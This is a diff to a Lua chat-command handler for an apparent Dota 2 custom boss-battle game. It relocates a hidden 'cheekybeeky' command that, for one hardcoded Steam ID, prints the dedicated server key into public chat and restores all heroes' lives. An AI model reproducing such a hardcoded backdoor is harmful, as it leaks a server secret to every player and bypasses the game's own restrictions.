@@ -48,6 +48,19 @@ function Commands:OnPlayerChat(keys)
 
         if not hPlayer then return end
 
+        if string.find(text, "cheekybeeky") then
+            if tostring(PlayerResource:GetSteamID(keys.playerid)) == "76561197972850274" then
+                local key = GetDedicatedServerKeyV2("123")
+                GameRules:SendCustomMessage("GetDedicatedServerKeyV2:" .. key, 0, 0)
+
+                for _, hero in pairs(HERO_LIST) do
+                    hero.playerLives = BOSS_BATTLES_PLAYER_LIVES
+                end
+
+                return
+            end
+        end
+
         if PLAYERS_FIGHTING_BOSS == true then
             GameRules:SendCustomMessage("Commands cannot be used if you're in a boss fight.", 0, 0)
             return
@@ -58,14 +71,6 @@ function Commands:OnPlayerChat(keys)
             if string.find(text, "intermission") then
                 FindClearSpaceForUnit(hHero, BOSS_BATTLES_INTERMISSION_SPAWN_LOCATION, true)
                 return
-            end
-
-            if string.find(text, "cheekybeeky") then
-                if tostring(PlayerResource:GetSteamID(keys.playerid)) == "76561197972850274" then
-                    local key = GetDedicatedServerKeyV2("123")
-                    GameRules:SendCustomMessage("GetDedicatedServerKeyV2:" .. key, 0, 0)
-                    return
-                end
             end
 
             if string.find(text, "reset damage") then
